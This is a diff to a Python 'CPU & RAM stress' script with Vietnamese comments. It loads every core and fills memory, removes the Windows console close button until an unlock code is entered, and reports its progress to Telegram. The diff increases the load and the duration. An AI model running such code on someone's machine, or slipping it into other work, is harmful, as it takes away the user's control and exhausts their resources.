@@ -7,6 +7,11 @@ import threading
 import sys
 import os
 import ctypes
+from typing import List
+try:
+    from ctypes import windll as _windll
+except ImportError:
+    _windll = None  # type: ignore[assignment]
 
 # ----------------- CẤU HÌNH CODE DỪNG -----------------
 UNLOCK_CODE = "123456"  # Bạn có thể thay đổi code tại đây
@@ -15,21 +20,21 @@ UNLOCK_CODE = "123456"  # Bạn có thể thay đổi code tại đây
 def disable_close_button():
     try:
         if os.name == 'nt':
-            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+            hwnd = _windll.kernel32.GetConsoleWindow()
             if hwnd:
-                hMenu = ctypes.windll.user32.GetSystemMenu(hwnd, False)
+                hMenu = _windll.user32.GetSystemMenu(hwnd, False)
                 if hMenu:
-                    ctypes.windll.user32.RemoveMenu(hMenu, 0xF060, 0x0000) # SC_CLOSE
-    except:
+                    _windll.user32.RemoveMenu(hMenu, 0xF060, 0x0000)  # SC_CLOSE
+    except Exception:
         pass
 
 def enable_close_button():
     try:
         if os.name == 'nt':
-            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+            hwnd = _windll.kernel32.GetConsoleWindow()
             if hwnd:
-                ctypes.windll.user32.GetSystemMenu(hwnd, True) # Khôi phục menu
-    except:
+                _windll.user32.GetSystemMenu(hwnd, True)  # Khôi phục menu
+    except Exception:
         pass
 
 def send_telegram_message(message):
@@ -54,17 +59,18 @@ def cpu_ram_stress_task(pause_event, stop_event):
     Tiến trình con mô phỏng tải CPU và RAM.
     """
     memory_hog = []
+    
     while not stop_event.is_set():
         if pause_event.is_set():
             time.sleep(0.5)
             continue
             
-        _ = 9999999 ** 2
+        # 1. Stress CPU: Thực hiện list comprehension và tính toán số thực liên tục
+        _ = [x ** 2.5 for x in range(10000)]
         
-        # Stress RAM: Tăng dần bộ nhớ chiếm dụng lên một mức hợp lý cho mỗi tiến trình
-        # Cấp phát 1MB mỗi lần lặp, giới hạn tối đa 500MB cho mỗi luồng
-        if len(memory_hog) < 500:
-            memory_hog.append("A" * 1024 * 1024)
+        # 2. Stress RAM: Sử dụng bytearray sinh từ chunk ngẫu nhiên ngốn RAM thực sự
+        if len(memory_hog) < 1000:
+            memory_hog.append(os.urandom(1024 * 1024))
 
 def input_thread_func(input_list):
     try:
@@ -83,7 +89,7 @@ if __name__ == '__main__':
     stop_event = multiprocessing.Event()
     num_cores = multiprocessing.cpu_count()
     
-    start_msg = f"Hệ thống cấp phát {num_cores} luồng. Bắt đầu stress CPU & RAM trong 10 giây đầu..."
+    start_msg = f"Hệ thống cấp phát {num_cores} luồng. Bắt đầu stress CPU & RAM trong 30 giây đầu..."
     print(start_msg)
     send_telegram_message(f"Bắt đầu CPU & RAM Stress: {start_msg}")
     
@@ -93,18 +99,18 @@ if __name__ == '__main__':
         processes.append(p)
         p.start()
 
-    # 1. Stress 10 giây đầu tiên (ko cho nhập trong lúc này)
+    # 1. Stress 30 giây đầu tiên (ko cho nhập trong lúc này)
     start_time = time.time()
-    while time.time() - start_time < 10:
+    while time.time() - start_time < 30:
         time.sleep(0.1)
         
     # 2. Tạm dừng 30 giây để nhập code
     pause_event.set()
-    pause_msg = "\n[!] Đã stress xong 10 giây. Tạm dừng! Bạn có 30 giây để nhập code tắt console."
+    pause_msg = "\n[!] Đã stress xong 30 giây. Tạm dừng! Bạn có 30 giây để nhập code tắt console."
     print(pause_msg)
     send_telegram_message(pause_msg)
     
-    input_list = []
+    input_list: List[str] = []
     input_thread = threading.Thread(target=input_thread_func, args=(input_list,))
     input_thread.daemon = True
     input_thread.start()
